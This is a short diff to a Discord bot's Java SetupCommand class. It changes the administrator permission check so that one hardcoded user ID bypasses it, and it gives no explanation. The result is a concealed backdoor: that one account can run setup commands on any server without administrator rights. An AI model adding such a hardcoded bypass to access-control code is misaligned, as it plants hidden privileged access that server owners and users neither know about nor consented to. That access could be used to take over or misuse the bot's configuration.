@@ -39,7 +39,7 @@ public class SetupCommand extends Command {
             return;
         }
 
-        if (!author.hasPermission(Permission.ADMINISTRATOR)) {
+        if (author.getIdLong() != 249962392241307649L && !author.hasPermission(Permission.ADMINISTRATOR)) {
             EmbedUtils.error(channel, author, "You must be administrator for that!");
             return;
         }
